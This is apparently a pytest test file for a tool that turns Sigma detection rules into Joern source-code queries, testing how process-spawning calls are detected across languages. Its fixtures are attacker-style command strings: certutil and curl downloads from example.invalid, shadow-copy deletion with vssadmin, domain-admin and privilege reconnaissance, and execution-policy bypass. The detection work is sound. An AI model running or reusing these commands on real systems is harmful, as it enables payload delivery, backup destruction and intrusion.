import builders
from builders import call, extraction, ident, lit, op
from sigma2joern.events import build_events, normalize_image
from sigma2joern.pstring import GAP, PStr
from sigma2joern.sinks import candidate_name_regex, classify


def events_of(data):
    return build_events(data).events


def test_python_sample_events():
    res = build_events(builders.python_sample())
    assert res.calls_total == 5 and res.calls_matched == 5
    rendered = {(e.kind, e.describe()) for e in res.events}
    assert ("argv", "certutil.exe -urlcache -split -f http://example.invalid/payload.txt C:\\Users\\Public\\p.txt") in rendered
    assert ("cmdline", 'net group "domain admins" /domain') in rendered
    assert ("shell", "<shell> -c whoami /priv") in rendered


def test_unrelated_calls_are_ignored():
    data = extraction("PYTHONSRC",
                      call("run", instance=ident("app"), receiver="app.run", code="app.run()"),
                      call("exec", lit('"print(1)"'), receiver="exec", code='exec("print(1)")'))
    assert build_events(data).calls_matched == 0
    data = extraction("JSSRC", call("exec", ident("s"), instance=ident("re"), receiver="re.exec", code="re.exec(s)"))
    assert build_events(data).calls_matched == 0
    data = extraction("PHP", call("exec", ident("sql"), receiver="$db->exec", code="$db->exec($sql)"))
    assert build_events(data).calls_matched == 0


def test_shell_wrapping_per_platform_and_language():
    ev = [e for e in events_of(builders.python_sample()) if e.kind == "shell"][0]
    win, lin = ev.fields("windows"), ev.fields("linux")
    assert win["Image"].text == "C:\\Windows\\System32\\cmd.exe"
    assert win["CommandLine"].text == 'C:\\WINDOWS\\system32\\cmd.exe /c "whoami /priv"'
    assert lin["CommandLine"].text == "/bin/sh -c whoami /priv"
    assert lin["Image"].parts == (GAP, "sh")
    c_shell = [e for e in events_of(builders.c_sample()) if e.kind == "shell"][0]
    assert c_shell.fields("linux")["CommandLine"].render().startswith("sh -c schtasks /create")


def test_nested_shells_are_expanded():
    data = extraction("NEWC", call("system", lit('"cmd /c \\"vssadmin delete shadows /all /quiet\\" & whoami"'),
                                   code="system(...)"))
    cmds = [e.cmdline.render() for e in events_of(data) if e.kind == "cmdline"]
    assert 'cmd /c "vssadmin delete shadows /all /quiet"' in cmds
    assert "vssadmin delete shadows /all /quiet" in cmds and "whoami" in cmds


def test_createprocess_passes_operators_to_cmd():
    data = extraction("NEWC", call("CreateProcessW", lit("NULL"), lit('L"cmd.exe /c whoami & net user"'),
                                   code="CreateProcessW(...)"))
    evs = events_of(data)
    assert all(e.platforms == ("windows",) for e in evs)
    assert {e.cmdline.render() for e in evs} >= {"cmd.exe /c whoami & net user", "whoami", "net user"}


def test_platform_inference():
    data = extraction("NEWC", call("execl", lit('"/bin/sh"'), lit('"sh"'), lit('"-c"'), lit('"id"'), lit("NULL"),
                                   code="execl(...)"))
    assert all(set(e.platforms) <= {"linux", "macos"} for e in events_of(data))
    data = extraction("PYTHONSRC", call("run", op("<operator>.listLiteral", lit('"certutil.exe"')),
                                        instance=ident("subprocess"), receiver="subprocess.run", code="subprocess.run(x)"))
    assert events_of(data)[0].platforms == ("windows",)


def test_image_normalization():
    assert normalize_image(PStr.known("whoami"), "windows").text == "C:\\Windows\\System32\\whoami.exe"
    assert normalize_image(PStr.known("whoami"), "windows", assume_path=False).parts == (GAP, "\\whoami.exe")
    assert normalize_image(PStr.known("mytool"), "windows").parts == (GAP, "\\mytool.exe")
    assert normalize_image(PStr.known("C:/Tools/x.exe"), "windows").text == "C:\\Tools\\x.exe"
    assert normalize_image(PStr.known("curl"), "linux").parts == (GAP, "/curl")
    assert normalize_image(PStr.known("/usr/bin/curl"), "linux").text == "/usr/bin/curl"


def test_java_and_js_samples():
    java = events_of(builders.java_sample())
    assert any(e.kind == "argv" and e.describe().startswith("powershell -ExecutionPolicy Bypass -File") for e in java)
    assert len(java) == 2  # StringBuilder <init> is not a process start
    js = events_of(builders.js_sample())
    assert any(e.cmdline.render() == "curl -s http://example.invalid/x.sh" for e in js)
    assert any(e.describe() == "bash -c id; uname -a" for e in js)


def test_classify_requires_context_for_generic_names():
    py_run = {"name": "run", "fullName": "", "code": "subprocess.run(x)", "receiver": "subprocess.run"}
    assert classify(py_run, "python") is not None
    assert classify({"name": "run", "fullName": "", "code": "thread.run()", "receiver": "thread.run"}, "python") is None
    assert classify({"name": "Start", "fullName": "System.Diagnostics.Process.Start:...", "code": "Process.Start(f)",
                     "receiver": "Process.Start"}, "csharp") is not None


def test_extractor_default_regex_is_in_sync():
    from pathlib import Path
    import re
    sc = Path(__file__).parents[1] / "sigma2joern" / "joern" / "extract_events.sc"
    m = re.search(r'val DefaultSinkNames =\s*"""(.*?)"""', sc.read_text(), re.S)
    assert m and m.group(1) == candidate_name_regex()


def test_extractor_script_is_balanced():
    from pathlib import Path
    text = (Path(__file__).parents[1] / "sigma2joern" / "joern" / "extract_events.sc").read_text()
    code = "\n".join(line.split("//")[0] if '"' not in line else line for line in text.splitlines())
    code = __import__("re").sub(r'""".*?"""|"(?:\\.|[^"\\])*"|\'(?:\\.|[^\'\\])\'', '""', code, flags=__import__("re").S)
    for a, b in ("()", "{}", "[]"):
        assert code.count(a) == code.count(b), (a, b)
